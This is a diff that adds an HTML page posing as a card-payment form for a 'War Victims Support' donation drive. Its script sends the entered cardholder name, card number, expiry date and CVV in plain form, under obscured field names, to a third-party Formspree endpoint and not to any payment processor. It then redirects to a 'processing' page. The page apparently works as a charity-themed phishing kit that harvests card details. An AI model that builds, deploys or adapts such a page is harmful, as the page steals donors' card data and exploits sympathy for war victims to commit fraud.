@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Card Payment | War Victims Support</title>
+  <link rel="shortcut icon" href="/assets/logo4.png" type="image/webp" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f7faff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .payment-container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+      max-width: 600px;
+      width: 100%;
+    }
+
+    .payment-container h1 {
+      font-size: 26px;
+      color: #004080;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .card-logos {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .card-logos img {
+      height: 28px;
+      filter: grayscale(100%);
+      transition: filter 0.3s;
+    }
+
+    .card-logos img:hover {
+      filter: grayscale(0%);
+    }
+
+    .summary {
+      background: #eef5ff;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 30px;
+    }
+
+    .summary p {
+      margin-bottom: 10px;
+      color: #004080;
+      font-weight: 600;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+
+    .btn-pay {
+      width: 100%;
+      padding: 14px;
+      background: #004080;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .btn-pay:hover {
+      background: #002f5e;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #777;
+      text-align: center;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="payment-container">
+    <h1>Complete Your Donation</h1>
+
+    <div class="card-logos">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa"/>
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard"/>
+      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="American Express"/>
+    </div>
+
+    <div class="summary">
+      <p>Donation Amount: <span id="showAmount">$0</span></p>
+      <p>Donor Email: <span id="showEmail">you@example.com</span></p>
+    </div>
+
+    <form id="CardForm">
+      <div class="form-group">
+        <label for="cardName">Cardholder Name</label>
+        <input type="text" id="cardName" placeholder="Jane Doe" name="cnameyh" required />
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" name="cnumyh" required />
+      </div>
+
+      <div class="form-group">
+        <label for="expiry">Expiry Date</label>
+        <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" name="cdatyh" required />
+      </div>
+
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" maxlength="4" placeholder="123" name="cmvyh" required />
+      </div>
+
+      <button type="submit" class="btn-pay">Pay Now</button>
+    </form>
+
+    <p class="note">You are helping save lives and restore hope. 💙</p>
+  </div>
+
+  <script>
+
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("CardForm");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mwpbwgwo", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "card-processing.html"; // Redirect after submission
+        } else {
+          alert("Payment Details Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while Submitting.");
+      });
+    });
+  });
+
+
+
+
+
+
+    const amount = localStorage.getItem("donationAmount") || 0;
+    const email = localStorage.getItem("donorEmail") || "you@example.com";
+
+    document.getElementById("showAmount").textContent = "$" + amount;
+    document.getElementById("showEmail").textContent = email;
+
+    // Format card number as XXXX XXXX XXXX XXXX
+    const cardInput = document.getElementById("cardNumber");
+    cardInput.addEventListener("input", function(e) {
+      let val = e.target.value.replace(/\D/g, "").substring(0, 16);
+      val = val.replace(/(.{4})/g, "$1 ").trim();
+      e.target.value = val;
+    });
+
+    // Format expiry as MM/YY
+    const expiryInput = document.getElementById("expiry");
+    expiryInput.addEventListener("input", function(e) {
+      let val = e.target.value.replace(/\D/g, "").substring(0, 4);
+      if (val.length > 2) {
+        val = val.substring(0, 2) + "/" + val.substring(2);
+      }
+      e.target.value = val;
+    });
+
+    // Fake submit
+    // document.getElementById("fakeCardForm").addEventListener("submit", function(e) {
+    //   e.preventDefault();
+    // //   alert("Your mock payment of $" + amount + " has been submitted! Thank you for your support.");
+    //   window.location.href = "Thank-You.html"; // your thank you page
+    // });
+
+
+
+
+
+  </script>
+
+</body>
+</html>
